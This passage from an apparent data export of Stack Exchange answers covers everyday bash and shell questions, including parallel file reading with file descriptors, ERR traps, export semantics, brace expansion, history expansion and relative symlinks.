<p>so doing the following should work:</p>

<pre><code>setfacl -R -m u:colleague:rwX .
</code></pre>

<p>(all quotes are from <code>man setfacl</code> for <em>acl-2.2.52</em> as shipped with Debian)</p>
"
"How to read from two input files using while loop","26601","<bash><shell-script><io-redirection>","29","<p>If you know for sure that some character will never occur in the first file then you can use paste.</p>

<p>Example of paste using default delimiter tab:</p>

<pre><code>paste file1 file2 | while IFS=""$(printf '\t')"" read -r f1 f2
do
  printf 'f1: %s\n' ""$f1""
  printf 'f2: %s\n' ""$f2""
done
</code></pre>

<p>Example of paste using <code>@</code>:</p>

<pre><code>paste -d@ file1 file2 | while IFS=""@"" read -r f1 f2
do
  printf 'f1: %s\n' ""$f1""
  printf 'f2: %s\n' ""$f2""
done
</code></pre>

<p>Note that it is enough if the character is guaranteed to not occur in the first file. This is because <code>read</code> will ignore <code>IFS</code> when filling the last variable. So even if <code>@</code> occurs in the second file it will not be split.</p>

<p>Example of paste using some bash features for arguably cleaner code:</p>

<pre><code>while IFS=$'\t' read -r f1 f2
do
  printf 'f1: %s\n' ""$f1""
  printf 'f2: %s\n' ""$f2""
done &lt; &lt;(paste file1 file2)
</code></pre>

<p>Bash features used: <a href=""http://wiki.bash-hackers.org/syntax/quoting#ansi_c_like_strings"">ansi c string</a> (<code>$'\t'</code>) and <a href=""http://wiki.bash-hackers.org/syntax/expansion/proc_subst"">process substitution</a> (<code>&lt;(...)</code>) to <a href=""http://mywiki.wooledge.org/BashFAQ/024"">avoid the while loop in a subshell problem</a>.</p>

<p>If you cannot be certain that any character will never occur in both files then you can use <a href=""http://en.wikipedia.org/wiki/File_descriptor"">file descriptors</a>.</p>

<pre><code>while true
do
  read -r f1 &lt;&amp;3 || break
  read -r f2 &lt;&amp;4 || break
  printf 'f1: %s\n' ""$f1""
  printf 'f2: %s\n' ""$f2""
done 3&lt;file1 4&lt;file2
</code></pre>

<p>Not tested much. Might break on empty lines.</p>

<p>File descriptors number 0, 1, and 2 are already used for stdin, stdout, and stderr, respectively. File descriptors from 3 and up are (usually) free. The bash manual warns from using file descriptors greater than 9, because they are ""used internally"".</p>

<p>Note that open file descriptors are inherited to shell functions and external programs. Functions and programs inheriting an open file descriptor can read from (and write to) the file descriptor. You should take care to close all file descriptors which are not required before calling a function or external program.</p>

<p>Here is the same program as above with the actual work (the printing) separated from the meta-work (reading line by line from two files in parallel).</p>

<pre><code>work() {
  printf 'f1: %s\n' ""$1""
  printf 'f2: %s\n' ""$2""
}

while true
do
  read -r f1 &lt;&amp;3 || break
  read -r f2 &lt;&amp;4 || break
  work ""$f1"" ""$f2""
done 3&lt;file1 4&lt;file2
</code></pre>

<p>Now we pretend that we have no control over the work code and that code, for whatever reason, tries to read from file descriptor 3.</p>

<pre><code>unknowncode() {
  printf 'f1: %s\n' ""$1""
  printf 'f2: %s\n' ""$2""
  read -r yoink &lt;&amp;3 &amp;&amp; printf 'yoink: %s\n' ""$yoink""
}

while true
do
  read -r f1 &lt;&amp;3 || break
  read -r f2 &lt;&amp;4 || break
  unknowncode ""$f1"" ""$f2""
done 3&lt;file1 4&lt;file2
</code></pre>

<p>Here is an example output. Note that the second line from the first file is ""stolen"" from the loop.</p>

<pre><code>f1: file1 line1
f2: file2 line1
yoink: file1 line2
f1: file1 line3
f2: file2 line2
</code></pre>

<p>Here is how you should close the file descriptors before calling external code (or any code for that matter).</p>

<pre><code>while true
do
  read -r f1 &lt;&amp;3 || break
  read -r f2 &lt;&amp;4 || break
  # this will close fd3 and fd4 before executing anycode
  anycode ""$f1"" ""$f2"" 3&lt;&amp;- 4&lt;&amp;-
  # note that fd3 and fd4 are still open in the loop
done 3&lt;file1 4&lt;file2
</code></pre>
"
"How can I create an alias for a git [action] command (which includes spaces)?","48862","<bash><shell><terminal><alias><git>","29","<p>Not a direct answer to your question (since aliases can only be one word), but you should be using <code>git-config</code> instead:</p>

<pre><code>git config --global alias.civ commit -v
</code></pre>

<p>This creates a git alias so that <code>git civ</code> runs <code>git commit -v</code>.  Unfortunately, AFAIK <a href=""https://stackoverflow.com/questions/5916565/define-git-alias-with-the-same-name-to-shadow-original-command"">there is no way to override existing git commands with aliases</a>.  However, you can always pick a suitable alias name to live with as an alternative.</p>
"
"How do I find the line number in Bash when an error occured?","462156","<linux><bash><shell-script><scripting><logs>","29","<p>Rather than use your function, I'd use this method instead:</p>

<pre><code>$ cat yael.bash
#!/bin/bash

set -eE -o functrace

file1=f1
file2=f2
file3=f3
file4=f4

failure() {
  local lineno=$1
  local msg=$2
  echo ""Failed at $lineno: $msg""
}
trap 'failure ${LINENO} ""$BASH_COMMAND""' ERR

cp -- ""$file1"" ""$file2""
cp -- ""$file3"" ""$file4""
</code></pre>

<p>This works by trapping on ERR and then calling the <code>failure()</code> function with the current line number + bash command that was executed.</p>

<h3>Example</h3>

<p>Here I've not taken any care to create the files, <code>f1</code>, <code>f2</code>, <code>f3</code>, or <code>f4</code>. When I run the above script:</p>

<pre><code>$ ./yael.bash
cp: cannot stat ‘f1’: No such file or directory
Failed at 17: cp -- ""$file1"" ""$file2""
</code></pre>

<p>It fails, reporting the line number plus command that was executed.</p>
"
"Setting PATH vs. exporting PATH in ~/.bash_profile","138504","<bash><environment-variables><path><profile>","29","<p>To answer your questions specifically:</p>

<ol>
<li><p><code>export</code> <em>does</em> set the <code>$PATH</code> explicitly.</p></li>
<li><p>No. <code>export</code> sets environment for child processes, but <code>$PATH</code> is already set for the current environment. So, in the second example, when the command is read-in - and <em>before</em> <code>export</code> is executed - the current environment's value for <code>$PATH</code> is expanded into the <code>$PATH</code> word.</p></li>
<li><p>You should use whichever is necessary and/or comfortable for you. Neither makes any difference functionally, so this is primarily a question of style.</p></li>
</ol>

<p>POSIX defines the <a href=""http://pubs.opengroup.org/onlinepubs/9699919799/utilities/V3_chap02.html#export"" rel=""noreferrer""><code>export</code> builtin</a> so:</p>

<blockquote>
  <p>The shell shall give the <code>export</code> attribute to the variables corresponding to the specified names, which shall cause them to be in the environment of subsequently executed commands. If the name of a variable is followed by <em>= word</em>, then the value of that variable shall be set to <em>word</em>.</p>
</blockquote>

<p>From another of my <a href=""https://unix.stackexchange.com/a/137707/52934"">answers</a>:</p>

<p><em>There is little difference between declaring a shell variable and an environment variable. Because export is a builtin it declares an environment variable for the process next invoked, but if you don't invoke one that process remains the shell, and so your variable is twice evaluated.</em></p>

<p>You can remove all exports without any effect at all on exported variables so long as you don't use <code>export</code> to twice evaluate. By twice evaluate I mean:</p>

<pre><code>var1=var2 
export ""${var1}=var3""
echo ""$var2""
var3
</code></pre>

<p>Instead just use:</p>

<pre><code>set -a 
</code></pre>

<p>...at the top of the script. All variables defined thereafter will be automatically <code>exported</code> - which would include variables you might not have previously <code>export</code>ed. Alternatively you could only <code>set -a</code> for a portion of the script and later <code>set +a</code> to unset it - it could also work as function.</p>

<p>But subshells automatically inherit variable values anyway, so:</p>

<pre><code>var1=value
( echo ""$(echo ""$var1"")"" )
value
</code></pre>

<p><code>export</code> makes no difference in that case.</p>

<p>But if your script calls another script, or any other executable that interprets values you've <code>export</code>ed and you cease to <code>export</code> them, then those values will no longer be available in their environment. In the following example I use the shell variable <code>$PS1</code> - which defines the contents of an interactive shell's prompt - to demonstrate how variations on <code>export</code>ed variables affect child processes.</p>

<pre><code>export PS1=""$(printf ""this is another executable\n &gt; "")""
echo exit | sh -i

###OUTPUT###

this is another executable
 &gt; exit
exit
</code></pre>

<p>But ...</p>

<pre><code>PS1=""$(printf ""this is another executable\n &gt; "")""
echo exit | sh -i

###OUTPUT###

sh-4.3$ exit
exit
</code></pre>

<p>But then again, if you explicitly declare environment variables while invoking a process...</p>

<pre><code>PS1=""$(printf ""this is another executable\n &gt; "")""
{
echo exit | PS1=$PS1 sh -i
echo exit | sh -i
}

###OUTPUT###

this is another executable
 &gt; exit
exit
sh-4.3$ exit
exit
</code></pre>

<p>Any of the <code>ENV</code> files first invoked by a shell such as <code>.bashrc</code> or <code>.profile</code> will set variable values for the life of that shell. So any variables that are set and <code>export</code>ed within those files will maintain that <code>export</code> characteristic and be <code>export</code>ed to all child processes invoked by that shell for the life of the shell or until they are <code>unset</code>. </p>

<p>It is notable, though, that <code>bash</code> extends the <code>export</code> builtin somewhat to include the <code>-n</code> option - which enables you to remove the <code>export</code> attribute from a variable without <code>unset</code>ting it, but this is not portable behavior.</p>
"
"Copying files with multiple extensions","157286","<bash><shell><wildcards><cp>","29","<p>Brace expansion will get the job done.  <code>man bash</code> and search for <code>Brace Expansion</code>.</p>

<pre><code>cp *.{txt,jpg,png} destination/
</code></pre>

<p><strong>EDIT:</strong> </p>

<p>In keeping with the OP's request, the command above was missing the verbose option:</p>

<pre><code>cp -v *.{txt,jpg,png} destination/
</code></pre>
"
"Difference between >> and >\> operators?","64374","<bash><rhel>","29","<p>To append text to a file you use <code>&gt;&gt;</code>. To overwrite the data currently in that file, you use <code>&gt;</code>. In general, in bash and other shells, you escape special characters using <code>\</code>. </p>

<p>So, when you use <code>echo foo &gt;\&gt;</code> what you are saying is ""redirect to a file called <code>&gt;</code>"", but that is because you are escaping the second <code>&gt;</code>. It is equivalent to using <code>echo foo &gt; \&gt;</code> which is the same as <code>echo foo &gt; '&gt;'</code>.</p>

<p>So, yes, as Sirex said, that is likely a typo in your book. </p>
"
"How can I open a new terminal in the same directory of the last used one from a window manager keybind?","32508","<bash><terminal><cd-command><rxvt>","29","<p>I see three solutions using <code>.last_dir</code>. You can place the <code>echo $PWD &gt; ~/.last_dir</code> either:</p>

<ol>
<li><p>In a special function that would be a wrapper for <code>cd</code>:</p>

<pre><code>function cd_
{
  [[ -d ""$@"" ]] || return 1
  echo ""$@"" &gt; ~/.last_dir
  cd ""$@""
}
</code></pre>

<p>Place this in your <code>~/.bashrc</code> and then use <code>cd_</code> instead of cd every time you want your new working directory to be stored.</p></li>
<li><p>In your <code>$PROMPT_COMMAND</code> (<em>not recommended</em>):</p>

<pre><code>PROMPT_COMMAND=""$PROMPT_COMMAND; pwd &gt; ~/.last_dir""
</code></pre>

<p>You can test this directly from the terminal or place it in <code>~/.bashrc</code>. This solution, however, triggers a disk write each time the prompt appears, which might cause trouble - but on the other hand, <code>.last_dir</code> would contain the current directory no matter how you got there.</p></li>
<li><p>In a custom <em>perl extension script</em> for <code>rxvt</code>. I've never created one myself, but you can find quite a few examples on the web.</p></li>
</ol>
"
"Is there a way to flatten a .pdf image from the command line?","162922","<bash><pdf><image-manipulation><gimp>","29","<p>I found these 2 method via Google, in this thread titled: <a href=""http://www.ncl.ucar.edu/Support/talk_archives/2011/0681.html"" rel=""noreferrer"">Re: Flattening PDF Files at the UNIX Command Line</a>.</p>

<em>Method #1 - using Imagemagick's convert:</em>

<pre><code>$ convert -density 300 orig.pdf flattened.pdf 
</code></pre>

<p><strong>NOTE:</strong> The quality is reported to be so so with this approach.</p>

<em>Method #2 - Using pdf2ps -> ps2pdf:</em>

<pre><code>$ pdf2ps orig.pdf - | ps2pdf - flattened.pdf
</code></pre>

<p><strong>NOTE:</strong> This method is reported to retain the image quality.</p>
"
"How to cut till first delimiter and get remaining part of strings?","394490","<bash><text-processing>","29","<p>Simply with <code>cut</code> command:</p>

<pre><code>echo ""pandi/sha/Dev/bin/boot"" | cut -d'/' -f2-
sha/Dev/bin/boot
</code></pre>

<hr>

<ul>
<li><p><code>-d'/'</code> - field delimiter</p></li>
<li><p><code>-f2-</code> - a range of fields to output (<code>-f&lt;from&gt;-&lt;to&gt;</code> ; in our case: from <code>2</code> to the last)</p></li>
</ul>
"
"bash if not multiple conditions without subshell?","247187","<bash><shell-script>","29","<p>You need to use <code>{ list;}</code> instead of <code>(list)</code>:</p>

<pre><code>if ! { [ -f file1 ] &amp;&amp; [ -f file2 ] &amp;&amp; [ -f file3 ]; }; then
  : do something
fi
</code></pre>

<p>Both of them are <a href=""http://pubs.opengroup.org/onlinepubs/9699919799/utilities/V3_chap02.html#tag_18_09_04_01"">Grouping Commands</a>, but <code>{ list;}</code> executes commands in current shell environment.</p>

<p>Note that, the <code>;</code> in <code>{ list;}</code> is needed to delimit the list from <code>}</code> reverse word, you can use other delimiter as well. The space (or other delimiter) after <code>{</code> is also required.</p>
"
"is there a way to list all 'indexes IDs' (keys) on a bash associative array variable?","91943","<bash><array>","29","<p>You can get the list of ""keys"" for the associative array like so:</p>

<pre><code>$ echo ""${!astr[@]}""
elemB elemA
</code></pre>

<p>You can iterate over the ""keys"" like so:</p>

<pre><code>for i in ""${!astr[@]}""
do   
  echo ""key  : $i""
  echo ""value: ${astr[$i]}""
done
</code></pre>

<h3>Example</h3>

<pre><code>$ for i in ""${!astr[@]}""; do echo ""key  : $i""; echo ""value: ${astr[$i]}""; done
key  : elemB
value: 199
key  : elemA
value: 123
</code></pre>

<h3>References</h3>

<ul>
<li><a href=""https://stackoverflow.com/questions/3112687/how-to-iterate-over-associative-array-in-bash"">How to iterate over associative array in bash</a></li>
</ul>
"
"What does !#:3 mean in a shell command","236382","<bash><command-history>","29","<p>This is a special syntax, expanded by bash. It also works for zsh.</p>

<p>According to the bash man page (section HISTORY EXPANSION), the pattern
expands as following:</p>

<ul>
<li>The <em>event designator</em> <code>!#</code> refers to the entire command line typed so far which is <code>curl http://beyondgrep.com/ack-2.14-single-file &gt; ~/bin/ack &amp;&amp; chmod 0755</code></li>
<li><code>:</code> splits between the <em>event designator</em> (this case the entire line)
and the <em>word designator</em> (selects a sub-part)</li>
<li>the <em>word designator</em> <code>3</code> which selects the <em>third</em> word/argument (counting of words starts at zero), in this case <code>~/bin/ack</code>.</li>
</ul>

<p>The final command line (usually displayed before executed) is:
<code>curl http://beyondgrep.com/ack-2.14-single-file &gt; ~/bin/ack &amp;&amp; chmod 0755 ~/bin/ack</code>.</p>

<p>For details, see the <a href=""https://www.gnu.org/software/bash/manual/html_node/History-Interaction.html"">bash manual</a> or very similar the <a href=""http://zsh.sourceforge.net/Doc/Release/Expansion.html#History-Expansion"">zsh manual</a></p>
"
"Adding numbers from the result of a grep","4840","<bash><shell><grep>","29","<pre><code>grep -o ""[0-9] errors"" verification_report_3.txt | awk '{ SUM += $1} END { print SUM }'
</code></pre>

<p>That doesn't print the list but does print the sum. If you want both the list and the sum, you can do:</p>

<pre><code>grep -o ""[0-9] errors"" verification_report_3.txt | awk '{ SUM += $1; print $1} END { print SUM }'
</code></pre>
"
"How can I use bash's if test and find commands together?","46541","<bash><shell-script><scripting><find><test>","29","<p><code>[</code> and <code>test</code> are synonyms (except <code>[</code> requires <code>]</code>), so you don't want to use <code>[ test</code>:</p>

<pre><code>[ -x /bin/cat ] &amp;&amp; echo 'cat is executable'
test -x /bin/cat &amp;&amp; echo 'cat is executable'
</code></pre>

<p><code>test</code> returns a zero exit status if the condition is true, otherwise nonzero. This can actually be replaced by any program to check its exit status, where 0 indicates success and non-zero indicates failure:</p>

<pre><code># echoes ""command succeeded"" because echo rarely fails
if /bin/echo hi; then echo 'command succeeded'; else echo 'command failed'; fi

# echoes ""command failed"" because rmdir requires an argument
if /bin/rmdir; then echo 'command succeeded'; else echo 'command failed'; fi
</code></pre>

<p>However, all of the above examples only test against the program's exit status, and ignore the program's output.</p>

<p>For <code>find</code>, you will need to test if any output was generated. <code>-n</code> tests for a non-empty string:</p>

<pre><code>if [[ -n $(find /var/log/crashes -name ""app-*.log"" -mmin -5) ]]
then
    service myapp restart
fi
</code></pre>

<p>A full list of test arguments is available by invoking <code>help test</code> at the <code>bash</code> commandline.</p>

<p><sub>If you are using <code>bash</code> (and not <code>sh</code>), you can use <code>[[ condition ]]</code>, which behaves more predictably when there are spaces or other special cases in your condition. Otherwise it is generally the same as using <code>[ condition ]</code>. I've used <code>[[ condition ]]</code> in this example, as I do whenever possible.</sub></p>

<p><sub>I also changed <code>`command`</code> to <code>$(command)</code>, which also generally behaves similarly, but is nicer with nested commands.</sub></p>
"
"ln -s with a path relative to pwd","125132","<bash><shell><symlink><ln>","29","<p>The easiest way to link to the current directory as an absolute path, without typing the whole path string would be</p>

<pre><code>ln -s ""$(pwd)/foo"" ~/bin/foo_link
</code></pre>

<p>The <code>target</code> (first) argument for the <code>ln -s</code> command works relative to the symbolic link's location, not your current directory. It helps to know that, essentially, the created symlink (the second argument) simply holds the <em>text</em> you provide for the first argument.</p>

<p>Therefore, if you do the following:</p>

<pre><code>cd some_directory
ln -s foo foo_link
</code></pre>

<p>and then move that link around</p>

<pre><code>mv foo_link ../some_other_directory
ls -l ../some_other_directory
</code></pre>

<p>you will see that <code>foo_link</code> <em>tries</em> to point to <code>foo</code> in the directory it is residing in. This also works with symbolic links pointing to relative paths. If you do the following:</p>

<pre><code>ln -s ../foo yet_another_link
</code></pre>

<p>and then move <code>yet_another_link</code> to another directory and check where it points to, you'll see that it always points to <code>../foo</code>. This is the intended behaviour, since many times symbolic links might be part of a directory structure that can reside in various absolute paths.</p>

<p>In your case, when you create the link by typing</p>

<pre><code>ln -s foo ~/bin/foo_link
</code></pre>

<p><code>foo_link</code> just holds a link to <code>foo</code>, relative to its location. Putting <code>$(pwd)</code> in front of the target argument's name simply adds the current working directory's absolute path, so that the link is created with an absolute target.</p>
"